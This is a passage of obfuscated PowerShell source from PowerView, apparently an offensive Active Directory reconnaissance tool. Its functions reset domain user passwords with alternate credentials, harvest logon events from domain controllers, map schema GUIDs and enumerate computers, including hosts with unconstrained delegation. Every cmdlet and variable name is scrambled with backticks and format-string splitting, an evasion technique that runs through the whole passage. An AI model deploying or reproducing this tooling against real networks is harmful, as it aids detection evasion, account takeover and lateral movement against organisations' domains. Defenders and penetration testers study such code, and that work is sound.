Resets the password for 'andy' to the password specified.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred

Resets the password for 'andy' usering the alternate credentials specified.

.OUTPUTS

DirectoryServices.AccountManagement.UserPrincipal

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = ${tr`UE})]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        ${Id`en`TITy},

        [Parameter(Mandatory = ${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        ${ACcoUntpA`ss`W`Ord},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OmAIN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`e`d`entIAL} = [Management.Automation.PSCredential]::Empty
    )

    ${coNtE`XtA`Rgu`me`NTs} = @{ 'Identity' = ${IDeN`Ti`TY} }
    if (${psbOU`NdP`Ar`Am`e`TERS}['Domain']) { ${Cont`EXT`A`RgU`MEntS}['Domain'] = ${DoMa`IN} }
    if (${Ps`BO`Un`dpAR`AmeTeRs}['Credential']) { ${C`On`TEXTaRGuMen`Ts}['Credential'] = ${CR`edENtI`Al} }
    ${conte`XT} = &("{3}{5}{4}{2}{1}{6}{0}"-f 't','l','cipa','Get','n','-Pri','Contex') @ContextArguments

    if (${C`o`Ntext}) {
        ${US`eR} = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity(${cO`NtexT}.Context, ${iDe`NTI`Ty})

        if (${u`Ser}) {
            &("{0}{3}{2}{1}" -f 'Wri','rbose','Ve','te-') "[Set-DomainUserPassword] Attempting to set the password for user '$Identity'"
            try {
                ${Te`M`pcRed} = &("{0}{2}{3}{1}" -f 'Ne','t','w-Obje','c') ("{0}{7}{11}{3}{5}{12}{2}{9}{10}{4}{6}{8}{1}" -f'Syste','l','o','t.A','re','utomat','de','m.Man','ntia','n.','PSC','agemen','i')('a', ${acC`O`UNTpAs`SW`orD})
                ${U`SEr}.SetPassword(${t`E`mpCREd}.GetNetworkCredential().Password)

                ${nU`LL} = ${uS`er}.Save()
                &("{1}{3}{0}{2}"-f'e','Wr','-Verbose','it') "[Set-DomainUserPassword] Password for user '$Identity' successfully reset"
            }
            catch {
                &("{0}{2}{1}{3}"-f 'Wr','Warni','ite-','ng') "[Set-DomainUserPassword] Error setting password for user '$Identity' : $_"
            }
        }
        else {
            &("{2}{1}{0}" -f 'ng','arni','Write-W') "[Set-DomainUserPassword] Unable to find user '$Identity'"
        }
    }
}


function GeT-dO`mainUser`Ev`Ent {
<#
.SYNOPSIS

Enumerate account logon events (ID 4624) and Logon with explicit credential
events (ID 4648) from the specified host (default of the localhost).

Author: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function uses an XML path filter passed to Get-WinEvent to retrieve
security events with IDs of 4624 (logon events) or 4648 (explicit credential
logon events) from -StartTime (default of now-1 day) to -EndTime (default of now).
A maximum of -MaxEvents (default of 5000) are returned.

.PARAMETER ComputerName

Specifies the computer name to retrieve events from, default of localhost.

.PARAMETER StartTime

The [DateTime] object representing the start of when to collect events.
Default of [DateTime]::Now.AddDays(-1).

.PARAMETER EndTime

The [DateTime] object representing the end of when to collect events.
Default of [DateTime]::Now.

.PARAMETER MaxEvents

The maximum number of events to retrieve. Default of 5000.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target computer.

.EXAMPLE

Get-DomainUserEvent

Return logon events on the local machine.

.EXAMPLE

Get-DomainController | Get-DomainUserEvent -StartTime ([DateTime]::Now.AddDays(-3))

Return all logon events from the last 3 days from every domain controller in the current domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUserEvent -ComputerName PRIMARY.testlab.local -Credential $Cred -MaxEvents 1000

Return a max of 1000 logon events from the specified machine using the specified alternate credentials.

.OUTPUTS

PowerView.LogonEvent

PowerView.ExplicitCredentialLogonEvent

.LINK

http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${T`Rue}, ValueFromPipelineByPropertyName = ${T`RUE})]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${coMPuTE`Rn`Ame} = ${E`Nv:CO`mpuT`eRnAmE},

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${STarT`Ti`mE} = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${enD`T`ime} = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        ${mAXE`Ve`NTs} = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`eDEnT`ial} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        # the XML filter we're passing to Get-WinEvent
        ${x`p`AThFIl`TEr} = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        ${e`VeNTargUMen`TS} = @{
            'FilterXPath' = ${Xpa`THFiL`T`ER}
            'LogName' = 'Security'
            'MaxEvents' = ${MAxev`EN`TS}
        }
        if (${psbouNDpA`RAm`et`Ers}['Credential']) { ${eVeNt`A`R`GuME`NtS}['Credential'] = ${CR`edE`NtI`Al} }
    }

    PROCESS {
        ForEach (${Com`Puter} in ${COm`pUTErn`Ame}) {

            ${e`V`enTa`RGUmenTS}['ComputerName'] = ${C`oM`put`eR}

            &("{1}{2}{0}{3}" -f 'n','Get-Wi','nEve','t') @EventArguments| &("{2}{3}{1}{0}" -f'-Object','ch','Fo','rEa') {
                ${eV`ent} = ${_}
                ${PRO`perTI`Es} = ${evE`NT}.Properties
                Switch (${evE`Nt}.Id) {
                    # logon event
                    4624 {
                        # skip computer logons, for now...
                        if(-not ${P`Ro`PeRTIeS}[5].Value.EndsWith('$')) {
                            ${O`Ut`puT} = &("{3}{0}{1}{2}"-f 'w','-','Object','Ne') ("{0}{1}{2}"-f 'PSO','bje','ct') -Property @{
                                ComputerName              = ${C`oMPUt`er}
                                TimeCreated               = ${Eve`Nt}.TimeCreated
                                EventId                   = ${E`VEnt}.Id
                                SubjectUserSid            = ${pro`peR`TIes}[0].Value.ToString()
                                SubjectUserName           = ${ProP`E`R`TIes}[1].Value
                                SubjectDomainName         = ${pR`Ope`Rt`IES}[2].Value
                                SubjectLogonId            = ${Pr`OPe`RTIEs}[3].Value
                                TargetUserSid             = ${P`RoPErTI`eS}[4].Value.ToString()
                                TargetUserName            = ${p`R`OP`ErTIEs}[5].Value
                                TargetDomainName          = ${Pr`o`p`ERties}[6].Value
                                TargetLogonId             = ${P`ROPe`R`Ties}[7].Value
                                LogonType                 = ${PrOpER`TI`es}[8].Value
                                LogonProcessName          = ${P`ROPe`RtI`Es}[9].Value
                                AuthenticationPackageName = ${p`R`ope`RTies}[10].Value
                                WorkstationName           = ${p`R`OPeR`TIeS}[11].Value
                                LogonGuid                 = ${Pro`pE`R`Ties}[12].Value
                                TransmittedServices       = ${Pro`Per`T`ies}[13].Value
                                LmPackageName             = ${pr`o`pErtIEs}[14].Value
                                KeyLength                 = ${p`RO`Pe`RTIeS}[15].Value
                                ProcessId                 = ${p`ROPERt`ieS}[16].Value
                                ProcessName               = ${pROP`ert`iEs}[17].Value
                                IpAddress                 = ${pr`Op`ErTieS}[18].Value
                                IpPort                    = ${P`Ro`PERTi`es}[19].Value
                                ImpersonationLevel        = ${prO`peRt`IEs}[20].Value
                                RestrictedAdminMode       = ${P`R`OpErT`IeS}[21].Value
                                TargetOutboundUserName    = ${P`ROpE`RtiEs}[22].Value
                                TargetOutboundDomainName  = ${PrOPeR`TI`Es}[23].Value
                                VirtualAccount            = ${pROPe`RTI`ES}[24].Value
                                TargetLinkedLogonId       = ${Pr`o`PERt`ieS}[25].Value
                                ElevatedToken             = ${PROp`Er`TIEs}[26].Value
                            }
                            ${OUt`P`UT}.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            ${OUTp`UT}
                        }
                    }

                    # logon with explicit credential
                    4648 {
                        # skip computer logons, for now...
                        if((-not ${pR`O`PeR`TIES}[5].Value.EndsWith('$')) -and (${PRoP`erti`Es}[11].Value -match 'taskhost\.exe')) {
                            ${O`UT`PuT} = &("{0}{1}{2}"-f 'New-Ob','je','ct') ("{2}{0}{1}"-f 'je','ct','PSOb') -Property @{
                                ComputerName              = ${cOMp`Ut`Er}
                                TimeCreated       = ${Ev`ent}.TimeCreated
                                EventId           = ${Ev`eNT}.Id
                                SubjectUserSid    = ${pROp`e`R`TIes}[0].Value.ToString()
                                SubjectUserName   = ${p`ROPEr`Ti`es}[1].Value
                                SubjectDomainName = ${p`Ropert`ies}[2].Value
                                SubjectLogonId    = ${Pro`peR`TiES}[3].Value
                                LogonGuid         = ${pROP`e`Rti`Es}[4].Value.ToString()
                                TargetUserName    = ${pR`oPE`RTIes}[5].Value
                                TargetDomainName  = ${p`RoPE`Rt`ieS}[6].Value
                                TargetLogonGuid   = ${pR`oP`eRT`ies}[7].Value
                                TargetServerName  = ${PRO`pERt`ies}[8].Value
                                TargetInfo        = ${P`R`oPert`IEs}[9].Value
                                ProcessId         = ${PRO`pE`RtIes}[10].Value
                                ProcessName       = ${p`R`O`pERTIeS}[11].Value
                                IpAddress         = ${prOP`E`Rti`ES}[12].Value
                                IpPort            = ${p`ROP`ER`TIeS}[13].Value
                            }
                            ${OU`TPUt}.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            ${oU`TPUt}
                        }
                    }
                    ("{0}{1}" -f 'defau','lt') {
                        &("{4}{2}{1}{3}{0}"-f'arning','ite-','r','W','W') "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}


function GE`T-domAInGui`Dm`Ap {
<#
.SYNOPSIS

Helper to build a hash table of [GUID] -> resolved names for the current or specified Domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-Forest  

.DESCRIPTION

Searches the forest schema location (CN=Schema,CN=Configuration,DC=testlab,DC=local) for
all objects with schemaIDGUID set and translates the GUIDs discovered to human-readable names.
Then searches the extended rights location (CN=Extended-Rights,CN=Configuration,DC=testlab,DC=local)
for objects where objectClass=controlAccessRight, translating the GUIDs again.

Heavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.OUTPUTS

Hashtable

Ouputs a hashtable containing a GUID -> Readable Name mapping.

.LINK

http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`O`MAIN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Ser`Ver},

        [ValidateRange(1, 10000)]
        [Int]
        ${Re`S`U`LTpAgE`SiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`RVER`T`iMeL`ImIT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReD`e`NtiaL} = [Management.Automation.PSCredential]::Empty
    )

    ${GU`I`DS} = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    ${FoRes`TA`RG`UMeNtS} = @{}
    if (${ps`BOuND`PA`RAmET`e`Rs}['Credential']) { ${foRES`TaRGu`M`En`Ts}['Credential'] = ${CR`ED`eNti`AL} }

    try {
        ${ScHEMAp`A`TH} = (&("{1}{3}{2}{0}" -f 't','Get-Fo','es','r') @ForestArguments).schema.name
    }
    catch {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }
    if (-not ${SC`hEma`PaTH}) {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }

    ${s`eA`Rc`HeR`ARGUmEntS} = @{
        'SearchBase' = ${sChE`m`APAth}
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if (${ps`BOu`N`DPARamE`TErs}['Domain']) { ${SEarchERA`R`g`UMents}['Domain'] = ${DOma`in} }
    if (${pSBOu`NdP`ARA`me`T`Ers}['Server']) { ${seArC`H`erArgU`MEN`Ts}['Server'] = ${s`er`VeR} }
    if (${PsbOUND`PAr`AM`E`TerS}['ResultPageSize']) { ${sE`A`Rc`H`ER`ArgUMEnTs}['ResultPageSize'] = ${RESUlt`pA`GEsi`Ze} }
    if (${Ps`BouND`P`ARamE`TErS}['ServerTimeLimit']) { ${seaR`chErARG`U`menTs}['ServerTimeLimit'] = ${sErvE`RtI`MeLIM`It} }
    if (${Ps`BOun`DpARaM`EteRs}['Credential']) { ${S`EArcHER`A`RgUmE`NTS}['Credential'] = ${cr`eD`e`NTIAl} }
    ${SCH`eM`AsEArC`Her} = &("{2}{0}{3}{4}{1}"-f'a','r','Get-DomainSe','rc','he') @SearcherArguments

    if (${s`CHE`MASEa`RC`her}) {
        try {
            ${r`eSU`lts} = ${ScHe`m`AsEArcH`Er}.FindAll()
            ${R`ESults} | &("{2}{1}{0}" -f'ect','-Obj','Where') {${_}} | &("{0}{1}{4}{3}{2}" -f'ForEa','ch-Ob','ct','e','j') {
                ${g`Uids}[(&("{2}{1}{0}" -f 'bject','ew-O','N') ("{0}{1}" -f'G','uid') (,${_}.properties.schemaidguid[0])).Guid] = ${_}.properties.name[0]
            }
            if (${ResU`l`Ts}) {
                try { ${Re`S`Ults}.dispose() }
                catch {
                    &("{3}{2}{1}{0}" -f 'e','os','erb','Write-V') "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
                }
            }
            ${Sch`Em`ASeaRCHer}.dispose()
        }
        catch {
            &("{1}{2}{0}" -f'rbose','W','rite-Ve') "[Get-DomainGUIDMap] Error in building GUID map: $_"
        }
    }

    ${seaRchEra`R`gumen`Ts}['SearchBase'] = ${sC`H`eMapAth}.replace('Schema','Extended-Rights')
    ${s`eA`RchE`RarGUmENTS}['LDAPFilter'] = '(objectClass=controlAccessRight)'
    ${rIGh`TSs`EARCHeR} = &("{1}{0}{3}{2}" -f 'mai','Get-Do','er','nSearch') @SearcherArguments

    if (${righ`TsS`eArCh`Er}) {
        try {
            ${re`s`UlTS} = ${riG`HtSSeaR`c`heR}.FindAll()
            ${reS`Ul`Ts} | &("{2}{1}{0}"-f 't','jec','Where-Ob') {${_}} | &("{1}{4}{3}{0}{2}"-f 'ec','ForEa','t','-Obj','ch') {
                ${g`UIDs}[${_}.properties.rightsguid[0].toString()] = ${_}.properties.name[0]
            }
            if (${re`s`UltS}) {
                try { ${r`e`sUlTs}.dispose() }
                catch {
                    &("{1}{3}{2}{4}{0}"-f'e','Wr','rb','ite-Ve','os') "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
                }
            }
            ${R`igHTSs`EaR`ch`er}.dispose()
        }
        catch {
            &("{3}{0}{1}{2}" -f'ite','-','Verbose','Wr') "[Get-DomainGUIDMap] Error in building GUID map: $_"
        }
    }

    ${g`UIdS}
}


function Ge`T-Dom`A`iNcomPUTer {
<#
.SYNOPSIS

Return all computers or specific computer objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all computer objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. WINDOWS10$), DistinguishedName (e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1124), GUID (e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),
or a dns host name (e.g. windows10.testlab.local). Wildcards accepted.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from $UACEnum, including
"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.

.PARAMETER Unconstrained

Switch. Return computer objects that have unconstrained delegation.

.PARAMETER TrustedToAuth

Switch. Return computer objects that are trusted to authenticate for other principals.

.PARAMETER Printers

Switch. Return only printers.

.PARAMETER SPN

Return computers with a specific service principal name, wildcards accepted.

.PARAMETER OperatingSystem

Return computers with a specific operating system, wildcards accepted.

.PARAMETER ServicePack

Return computers with a specific service pack, wildcards accepted.

.PARAMETER SiteName

Return computers in the specific AD Site name, wildcards accepted.

.PARAMETER Ping

Switch. Ping each host to ensure it's up before enumerating.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainComputer

Returns the current computers in current domain.

.EXAMPLE

Get-DomainComputer -SPN mssql* -Domain testlab.local

Returns all MS SQL servers in the testlab.local domain.

.EXAMPLE

Get-DomainComputer -UACFilter TRUSTED_FOR_DELEGATION,SERVER_TRUST_ACCOUNT -Properties dnshostname

Return the dns hostnames of servers trusted for delegation.

.EXAMPLE

Get-DomainComputer -SearchBase "LDAP://OU=secret,DC=testlab,DC=local" -Unconstrained

Search the specified OU for computeres that allow unconstrained delegation.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainComputer -Credential $Cred

.OUTPUTS

PowerView.Computer

Custom PSObject with translated computer property fields.

PowerView.Computer.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${TR`Ue}, ValueFromPipelineByPropertyName = ${t`RUE})]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        ${I`dEn`TiTy},

        [Switch]
        ${UN`cO`NSTRA`ined},

        [Switch]
        ${TRUST`e`dToAU`TH},

        [Switch]
        ${p`RiNTe`Rs},

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        ${S`pn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${oPerAt`i`Ng`sYSTem},

        [ValidateNotNullOrEmpty()]
        [String]
        ${S`ERv`IcePack},

        [ValidateNotNullOrEmpty()]
        [String]
        ${sI`TeN`AME},

        [Switch]
        ${P`inG},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`Omain},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${lDA`PFIlt`ER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PR`oP`e`RTIES},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sEARCh`Ba`Se},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`Er`Ver},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sEA`R`ch`SCOPE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${res`U`lt`PaGe`SizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`R`VEr`TIMelIm`IT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${sE`C`UrItyma`SKs},

        [Switch]
        ${To`MbsTo`Ne},

        [Alias('ReturnOne')]
        [Switch]
        ${f`iND`one},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`DEnt`iAl} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${R`Aw}
    )

    DynamicParam {
        ${uacVAlue`NAM`eS} = [Enum]::GetNames(${uAcen`Um})
        # add in the negations
        ${uaC`VAL`U`Ena`meS} = ${U`AC`V`Al`UEnaMEs} | &("{3}{1}{2}{0}" -f'ect','ach','-Obj','ForE') {${_}; "NOT_$_"}
        # create new dynamic parameter
        &("{1}{3}{2}{0}" -f'r','New-Dyna','amete','micPar') -Name ("{1}{0}" -f 'ter','UACFil') -ValidateSet ${UACv`AlUeN`A`MES} -Type ([array])
    }

    BEGIN {
        ${sEARCH`e`RARgumEn`TS} = @{}
        if (${p`s`BoUN`dPA`RaMEtErs}['Domain']) { ${SEa`RC`HERar`gUmE`NtS}['Domain'] = ${D`oMAIn} }
        if (${PsbOu`Nd`pARaM`ETE`Rs}['Properties']) { ${seArcHE`RArgu`M`E`NtS}['Properties'] = ${pRopE`R`TiES} }
        if (${ps`BOUnDp`ArA`meTERS}['SearchBase']) { ${S`ea`RCH`eraRGumeNts}['SearchBase'] = ${sE`ArcH`Ba`sE} }
        if (${p`s`BoundP`Ar`AmeTERs}['Server']) { ${SeaR`CHERAr`GUMEN`Ts}['Server'] = ${S`E`RVer} }
        if (${psbouNDpA`RAm`ETE`RS}['SearchScope']) { ${seArc`H`ERa`RguMENTs}['SearchScope'] = ${sEa`RCH`scOPE} }
        if (${psB`O`UND`pAraMETErS}['ResultPageSize']) { ${se`ArC`he`RaRGUM`ENtS}['ResultPageSize'] = ${ReSU`L`T`PaGesIzE} }
        if (${PSbou`N`dpaRam`etERs}['ServerTimeLimit']) { ${s`EArCHEr`A`RGUmEN`TS}['ServerTimeLimit'] = ${Serv`ERtIM`el`iMIT} }
        if (${P`sBOUnD`Param`ETERS}['SecurityMasks']) { ${sEA`Rc`hE`RaRgu`menTs}['SecurityMasks'] = ${SeC`UriT`ym`ASKs} }
        if (${pSbOuN`Dp`Ar`A`meTERS}['Tombstone']) { ${Se`Arche`RaR`GuMenTs}['Tombstone'] = ${TOm`B`STOnE} }
        if (${pSb`Ou`NdPA`RaMETErS}['Credential']) { ${sEaRC`hER`ArG`U`ME`Nts}['Credential'] = ${Cr`e`DenTi`Al} }
        ${CO`mpSeARc`H`er} = &("{2}{4}{3}{5}{0}{1}"-f'r','cher','G','t-Domain','e','Sea') @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if (${PSboUndpA`RAm`Et`ErS} -and (${PS`BoUNdPa`RAm`eTE`Rs}.Count -ne 0)) {
            &("{1}{2}{3}{0}{4}" -f'e','N','ew-Dyna','micParam','ter') -CreateVariables -BoundParameters ${P`sBoU`NdpArAMetE`Rs}
        }

        if (${C`o`MpsEa`R`CHeR}) {
            ${idEntit`y`F`ilter} = ''
            ${fi`LT`eR} = ''
            ${Id`EnTItY} | &("{2}{1}{0}" -f 't','jec','Where-Ob') {${_}} | &("{0}{1}{2}"-f 'ForEach','-Obj','ect') {
                ${iDE`NTI`TYI`N`st`AnCE} = ${_}.Replace('(', '\28').Replace(')', '\29')
                if (${identI`TyI`Ns`TaN`CE} -match '^S-1-') {
                    ${IdE`N`TIty`FI`lteR} += "(objectsid=$IdentityInstance)"
                }
                elseif (${I`deNTiTy`iNstan`CE} -match '^CN=') {
                    ${i`dEntiT`y`FILT`eR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${ps`BOun`D`pa`RAMEters}['Domain']) -and (-not ${ps`BOUndPara`ME`TERs}['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        ${i`dentI`TYDomAin} = ${IDeN`T`I`TYiNST`A`Nce}.SubString(${iD`eN`T`ityiNsTaNCE}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{3}{2}{0}{1}" -f 'ite-Verbos','e','r','W') "[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        ${seArC`h`E`RarGUmen`TS}['Domain'] = ${I`de`NTit`yDOMAIN}
                        ${cOm`PSEARc`h`ER} = &("{1}{3}{0}{4}{2}" -f 't-DomainSe','G','r','e','arche') @SearcherArguments
                        if (-not ${COm`pSe`Ar`c`heR}) {
                            &("{0}{1}{3}{2}"-f 'Write-War','n','g','in') "[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif (${idEnTIT`y`INs`TaNCE}.Contains('.')) {
                    ${idEnt`ITyFi`lt`ER} += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif (${I`Den`T`iTYIn`STan`Ce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${gUId`BY`T`EsTrING} = (([Guid]${i`denTI`Tyi`NST`ANce}).ToByteArray() | &("{1}{4}{2}{0}{3}" -f'ec','ForE','Obj','t','ach-') { '\' + ${_}.ToString('X2') }) -join ''
                    ${ID`en`TiT`yfi`lTer} += "(objectguid=$GuidByteString)"
                }
                else {
                    ${ID`E`NtITyFi`L`TeR} += "(name=$IdentityInstance)"
                }
            }
            if (${Id`ENTI`TYFI`LteR} -and (${idE`N`TI`TyFILT`eR}.Trim() -ne '') ) {
                ${FilT`er} += "(|$IdentityFilter)"
            }

            if (${P`s`Bo`UNDparAMetErs}['Unconstrained']) {
                &("{0}{3}{2}{1}" -f 'W','bose','te-Ver','ri') '[Get-DomainComputer] Searching for computers with for unconstrained delegation'
                ${f`I`LteR} += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if (${PSbo`Undpa`R`A`meteRs}['TrustedToAuth']) {
                &("{0}{2}{4}{3}{1}" -f'W','e','rite','bos','-Ver') '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'
                ${f`i`lter} += '(msds-allowedtodelegateto=*)'
            }
            if (${p`SboUNDp`Ar`A`mE`Ters}['Printers']) {
                &("{0}{1}{2}"-f'Writ','e','-Verbose') '[Get-DomainComputer] Searching for printers'
                ${F`i`lteR} += '(objectCategory=printQueue)'
            }
            if (${PSBOun`dp`A`RAMeterS}['SPN']) {
                &("{1}{2}{3}{0}"-f'bose','Wr','ite-Ve','r') "[Get-DomainComputer] Searching for computers with SPN: $SPN"
                ${Fi`L`Ter} += "(servicePrincipalName=$SPN)"
            }
